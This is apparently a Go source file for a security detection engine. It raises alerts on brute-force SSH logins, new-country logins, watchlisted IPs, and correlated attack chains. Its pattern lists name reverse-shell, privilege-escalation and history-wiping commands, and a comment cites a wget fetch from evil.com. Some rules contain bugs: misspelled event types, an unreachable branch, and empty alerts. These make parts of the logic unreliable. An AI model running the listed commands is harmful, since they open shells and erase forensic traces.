package rules

import (
	"bufio"
	"fmt"
	"log/slog"
	"nox/internal/model"
	"os"
	"strings"
	"sync"
	"time"

	"gopkg.in/yaml.v3"
)

type Rule func(event model.Event, state *StateManager) *model.Alert

// A CorrelationRule looks for chains of events and alerts over time.
type CorrelationRule func(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert

type StateManager struct {
	mu                      sync.RWMutex
	NewAccountTracker       map[string]time.Time
	FailedLoginAttempts     map[string][]time.Time        // Tracks failed login attempts. Key: IP Address, Value: List of timestamps.
	UserLoginLocations      map[string]map[string]bool    // we can add more state maps here for future rules, e.g.: Key: Username, Value: Set of country codes
	ProcessExecutionHistory map[string][]ProcessExecution // Track process execution patterns for behavioral analysis
	SuspiciousCommandCount  map[string]int                // Track suspicious command frequency per source
	BruteForceAlertedIPs    map[string]bool
	IPWatchlist             map[string]bool      // Set to store known bad IP addresses for fast lookups
	PostBruteForceLogins    map[string]time.Time // track IPs where brute force was followed by a successful login
	SuspiciousLoginTracker  map[string]time.Time // track recent suspicious logins to correlate with later activity
	StagedPayloads          map[string]time.Time
}

type ProcessExecution struct {
	Timestamp   time.Time
	ProcessName string
	Command     string
	PID         string
	PPID        string
	UID         string
}

type Condition struct {
	Field    string `yaml:"field"`
	Operator string `yaml:"operator"`
	Value    string `yaml:"value"`
}

type RuleDefinition struct {
	Name        string      `yaml:"name"`
	Description string      `yaml:"description"`
	TechniqueID string      `yaml:"technique_id"`
	Severity    string      `yaml:"severity"`
	EventType   string      `yaml:"event_type"`
	Conditions  []Condition `yaml:"conditions"`
}

var privEscPatterns = []string{
	"sudo su",
	"su -",
	"sudo -i",
	"sudo bash",
	"sudo sh",
}

var suspiciousCommands = map[string]string{
	"netcat":     "network_tool",
	"usermod":    "user_management",
	"userdel":    "user_management",
	"bash -i":    "reverse_shell",
	"sh -i":      "reverse_shell",
	"perl -e":    "script_execution",
	"history -c": "anti_forensics",
	"dd if=":     "disk_access",
	"/dev/tcp/":  "network_connection",
}

var defenseEvasionPatterns = []string{
	"history -c",
	"unset HISTFILE",
	"rm /root/.bash_history",
}

func NewStateManager() *StateManager {
	return &StateManager{
		NewAccountTracker:       make(map[string]time.Time),
		BruteForceAlertedIPs:    make(map[string]bool),
		FailedLoginAttempts:     make(map[string][]time.Time),
		IPWatchlist:             make(map[string]bool),
		ProcessExecutionHistory: make(map[string][]ProcessExecution),
		PostBruteForceLogins:    make(map[string]time.Time),
		StagedPayloads:          make(map[string]time.Time),
		SuspiciousCommandCount:  make(map[string]int),
		SuspiciousLoginTracker:  make(map[string]time.Time),
		UserLoginLocations:      make(map[string]map[string]bool),
	}
}

func LoadRulesFromFile(path string) ([]RuleDefinition, error) {
	slog.Info("Loading detection rules from file", "path", path)

	file, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %w", err)
	}

	var rules []RuleDefinition
	err = yaml.Unmarshal(file, &rules)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal rules yaml: %w", err)
	}

	slog.Info("Successfully loaded detection rules", "count", len(rules))
	return rules, nil
}

func LoadIPWatchlistFromFile(path string, state *StateManager) error {
	slog.Info("Loading IP watchlist from file...", "path", path)

	file, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("failed to read IP watchlist file: %w", err)
	}
	defer file.Close()

	newIPWatchlist := make(map[string]bool)
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip != "" && !strings.HasPrefix(ip, "#") {
			newIPWatchlist[ip] = true
		}
	}

	state.mu.Lock()
	state.IPWatchlist = newIPWatchlist
	state.mu.Unlock()

	slog.Info("Successfully loaded IP watchlist", "count", len(newIPWatchlist))
	return scanner.Err()
}

func checkConditions(event model.Event, rule RuleDefinition) bool {
	for _, cond := range rule.Conditions {
		fieldParts := strings.Split(cond.Field, ".")
		if len(fieldParts) != 2 || fieldParts[0] != "metadata" {
			continue
		}

		eventValue, ok := event.Metadata[fieldParts[1]]
		if !ok {
			return false
		}

		match := false

		switch cond.Operator {
		case "contains":
			match = strings.Contains(eventValue, cond.Value)
		case "equals":
			match = (eventValue == cond.Value)
		default:
			match = false
		}

		if !match {
			return false
		}
	}

	return true
}

func checkFailedLogins(event model.Event, state *StateManager) *model.Alert {
	if event.EventType != "SSHD_Failed_Password" {
		return nil
	}
	state.mu.Lock()
	defer state.mu.Unlock()

	//--- state logic ----//
	ip := event.Source
	const (
		threshold = 5
		window    = 60 * time.Second
	)

	// prune old timestamps that are outside the time window
	var recentAttempts []time.Time
	now := time.Now().UTC()
	for _, t := range state.FailedLoginAttempts[ip] {
		if now.Sub(t) <= window {
			recentAttempts = append(recentAttempts, t)
		}
	}

	// add new attempt
	recentAttempts = append(recentAttempts, event.Timestamp)
	state.FailedLoginAttempts[ip] = recentAttempts

	if state.BruteForceAlertedIPs[ip] {
		return nil
	}

	if len(recentAttempts) >= threshold {
		state.BruteForceAlertedIPs[ip] = true

		return &model.Alert{
			RuleName:  "TooManyFailedLogins",
			Message:   fmt.Sprintf("Detected %d failed SSH logins from %s in the last minute.", len(recentAttempts), ip),
			Severity:  "HIGH",
			Timestamp: event.Timestamp,
			Source:    ip,
			Metadata: map[string]string{
				"attempt_count": fmt.Sprintf("%d", len(recentAttempts)),
				"time_window":   window.String(),
			},
		}
	}

	return nil // no alert
}

func checkNewCountryLogins(event model.Event, state *StateManager) *model.Alert {
	if event.EventType != "SSHD_Accepted_Password" {
		return nil
	}

	user := event.Metadata["user"]
	country, ok := event.Metadata["country"]
	if !ok || user == "" {
		return nil // cant evaluate without user and country
	}

	state.mu.Lock()
	defer state.mu.Unlock()

	// check if user has a record of locations
	if _, ok := state.UserLoginLocations[user]; !ok {
		state.UserLoginLocations[user] = make(map[string]bool)
	}

	// check if country is new for user
	if !state.UserLoginLocations[user][country] {
		// new location, trigger alert
		state.UserLoginLocations[user][country] = true
		return &model.Alert{
			RuleName:  "NewCountryLogin",
			Message:   fmt.Sprintf("User '%s' logged in from a new country: %s (IP: %s)", user, country, event.Source),
			Severity:  "MEDIUM",
			Timestamp: event.Timestamp,
			Source:    event.Source,
			Metadata: map[string]string{
				"user":    user,
				"country": country,
			},
		}
	}

	return nil
}

func checkRapidProcessExecution(event model.Event, state *StateManager) *model.Alert {
	if event.EventType != "Process_Executed" {
		return nil
	}

	state.mu.Lock()
	defer state.mu.Unlock()

	source := event.Source
	const (
		threshold = 10
		window    = 30 * time.Second
	)

	history := state.ProcessExecutionHistory[source]
	if len(history) == 0 {
		return nil
	}

	cutoff := event.Timestamp.Add(-window)
	recentCount := 0
	for _, proc := range history {
		if proc.Timestamp.After(cutoff) {
			recentCount++
		}
	}

	if recentCount >= threshold {
		return &model.Alert{
			RuleName:  "RapidProcessExecution",
			Message:   fmt.Sprintf("Detected %d processes executed in %s from %s", recentCount, window, source),
			Severity:  "MEDIUM",
			Timestamp: event.Timestamp,
			Source:    source,
			Metadata: map[string]string{
				"process_count": fmt.Sprintf("%d", recentCount),
				"time_window":   window.String(),
			},
		}
	}

	return nil
}

func checkIPWatchlist(event model.Event, state *StateManager) *model.Alert {
	if event.Source == "" {
		return nil // cant check events without a source IP
	}

	state.mu.RLock()
	isMatch, found := state.IPWatchlist[event.Source]
	state.mu.RUnlock()

	if found && isMatch {
		return &model.Alert{
			RuleName:  "IPWatchlistMatch",
			Message:   fmt.Sprintf("Traffic detected from a known-bad IP address: %s", event.Source),
			Severity:  "HIGH",
			Timestamp: event.Timestamp,
			Source:    event.Source,
			Metadata: map[string]string{
				"mitre_tactic": "TA0011",
				"event_type":   event.EventType,
			},
		}
	}

	return nil
}

func correlateLoginAndEscalation(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	// check for the start of the chain (a NewCountryLogin)
	for _, alert := range existingAlerts {
		if alert.RuleName == "NewCountryLogin" {
			state.mu.Lock()
			state.SuspiciousLoginTracker[alert.Source] = alert.Timestamp
			state.mu.Unlock()
			return nil
		}
	}

	// check for the end of the chain (privilege escalation event)
	if event.EventType == "Processed_Executed" {
		isPrivEsc := false
		command := event.Metadata["command"]

		for _, pattern := range privEscPatterns {
			if strings.Contains(command, pattern) {
				isPrivEsc = true
				break
			}
		}

		if isPrivEsc {
			state.mu.Lock()
			defer state.mu.Unlock()

			if loginTime, ok := state.SuspiciousLoginTracker[event.Source]; ok {
				if event.Timestamp.Sub(loginTime) <= 10*time.Minute {
					delete(state.SuspiciousLoginTracker, event.Source)
					return &model.Alert{
						RuleName:  "CorrelatedAttackChain",
						Message:   fmt.Sprintf("Attack Chain Detected: A login from a new country (%s) was followed by a privilege escalation attempt.", event.Source),
						Severity:  "CRITICAL",
						Timestamp: event.Timestamp,
						Source:    event.Source,
						Metadata: map[string]string{
							"mitre_tactic":       "TA0004",
							"correlated_events":  "NewCountryLogin, PrivilegeEscalationAttempt",
							"time_to_escalation": event.Timestamp.Sub(loginTime).String(),
						},
					}
				}
			}
		}
	}

	return nil
}

func extractFilePath(command string) string {
	parts := strings.Fields(command)

	for _, part := range parts {
		if strings.HasPrefix(part, "/tmp/") || strings.HasPrefix(part, "/dev/shm") {
			return part
		}
	}
	return ""
}

func correlateDownloadAndExecute(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	if event.EventType != "Process_Executed" {
		return nil
	}

	// full chain. download -> make executable -> execute
	// wget -O /tmp/payload.sh http://evil.com/payload.sh
	command := event.Metadata["command"]
	processName := event.Metadata["process_name"]

	if processName == "wget" || processName == "curl" {
		filepath := extractFilePath(command)

		if filepath != "" {
			state.mu.Lock()
			state.StagedPayloads[filepath] = event.Timestamp
			state.mu.Unlock()
			slog.Debug("Stages a potential payload for correlation", "path", filepath)
		}
	}

	state.mu.Lock()
	defer state.mu.Unlock()

	for stagedPath, downloadTime := range state.StagedPayloads {
		if strings.Contains(command, stagedPath) && event.Timestamp.Sub(downloadTime) <= 2*time.Minute {
			delete(state.StagedPayloads, stagedPath)
			return &model.Alert{
				RuleName:  "CorrelatedDownloadAndExecute",
				Message:   fmt.Sprintf("Attack Chain Detected: A file was downloaded to %s and then executed.", stagedPath),
				Severity:  "CRITICAL",
				Timestamp: event.Timestamp,
				Source:    event.Source,
				Metadata: map[string]string{
					"mitre_technique":   "T1105",
					"time_to_execution": event.Timestamp.Sub(downloadTime).String(),
					"executed_command":  command,
					"staged_filepath":   stagedPath,
				},
			}
		}
	}

	return nil
}

func correlateBruteForceAndEvasion(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	if event.EventType != "Process_Executed" {
		return nil
	}

	if event.EventType == "SSHD_ACCEPTED_PASSWORD" {
		state.mu.Lock()
		defer state.mu.Unlock()

		// during a Brute Force attack, more than likely we will have the IP in BruteForceAlertedIPs struct
		if state.BruteForceAlertedIPs[event.Source] {
			slog.Debug("Correlating a successful login with a prior brute-force alert", "source", event.Source)
			state.PostBruteForceLogins[event.Source] = event.Timestamp
			delete(state.BruteForceAlertedIPs, event.Source)
		}
	}

	if event.EventType == "Process_Executed" {
		command := event.Metadata["command"]
		isDefenseEvasion := false

		for _, pattern := range defenseEvasionPatterns {
			if strings.Contains(command, pattern) {
				isDefenseEvasion = true
				break
			}
		}

		if isDefenseEvasion {
			state.mu.Lock()
			defer state.mu.Unlock()
			if loginTime, ok := state.PostBruteForceLogins[event.Source]; ok {
				if event.Timestamp.Sub(loginTime) <= 5*time.Minute {
					delete(state.PostBruteForceLogins, event.Source)
					return &model.Alert{}
				}
			}
		}
	}

	return nil
}

func correlateLocalAccountImmediateUse(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	switch event.EventType {
	case "Process_Executed":
		command := event.Metadata["command"]
		process := event.Metadata["process_name"]

		if process == "useradd" {
			parts := strings.Fields(command)
			if len(parts) > 1 {
				newUser := parts[len(parts)-1]
				state.mu.Lock()
				state.NewAccountTracker[newUser] = event.Timestamp
				state.mu.Unlock()
				slog.Debug("Tracking new account creation for correlation", "user", newUser)
			}
		}
	case "SSHD_Accepted_Passowrd":
		loginUser := event.Metadata["user"]
		if loginUser == "" {
			return nil
		}

		state.mu.Lock()
		defer state.mu.Unlock()

		if creationTime, ok := state.NewAccountTracker[loginUser]; ok {
			if event.Timestamp.Sub(creationTime) <= 1*time.Hour {
				delete(state.NewAccountTracker, loginUser)
				return &model.Alert{}
			}
		}
	}

	return nil
}

// activeRules is the registry of all rules the engine will run.
var activeRules = []Rule{
	checkFailedLogins,
	checkNewCountryLogins,
	checkRapidProcessExecution,
	checkIPWatchlist,
}

var activeCorrelationRules = []CorrelationRule{
	correlateLoginAndEscalation,
	correlateDownloadAndExecute,
	correlateBruteForceAndEvasion,
	correlateLocalAccountImmediateUse,
}

func EvaluateEvent(event model.Event, yamlRules []RuleDefinition, state *StateManager) []model.Alert {
	var triggeredAlerts []model.Alert

	if event.EventType == "Process_Executed" {
		state.mu.Lock()
		procExec := ProcessExecution{
			Timestamp:   event.Timestamp,
			ProcessName: event.Metadata["process_name"],
			Command:     event.Metadata["command"],
			PID:         event.Metadata["pid"],
			PPID:        event.Metadata["ppid"],
			UID:         event.Metadata["uid"],
		}

		state.ProcessExecutionHistory[event.Source] = append(state.ProcessExecutionHistory[event.Source], procExec)
		state.mu.Unlock()
	}

	for _, rule := range yamlRules {
		if event.EventType != rule.EventType {
			continue
		}

		if checkConditions(event, rule) {
			alert := model.Alert{
				RuleName:  rule.Name,
				Message:   rule.Description,
				Severity:  rule.Severity,
				Timestamp: event.Timestamp,
				Source:    event.Source,
				Metadata: map[string]string{
					"mitre_technique_id": rule.TechniqueID,
					"command":            event.Metadata["command"],
					"process_name":       event.Metadata["process_name"],
					"pid":                event.Metadata["pid"],
				},
			}
			triggeredAlerts = append(triggeredAlerts, alert)
		}
	}

	for _, rule := range activeRules {
		if alert := rule(event, state); alert != nil {
			triggeredAlerts = append(triggeredAlerts, *alert)
		}
	}

	return triggeredAlerts
}

func RunCorrelationRules(event model.Event, existingAlerts []model.Alert, state *StateManager) []model.Alert {
	var correlationAlerts []model.Alert

	for _, rule := range activeCorrelationRules {
		if alert := rule(event, existingAlerts, state); alert != nil {
			correlationAlerts = append(correlationAlerts, *alert)
		}
	}

	return correlationAlerts
}
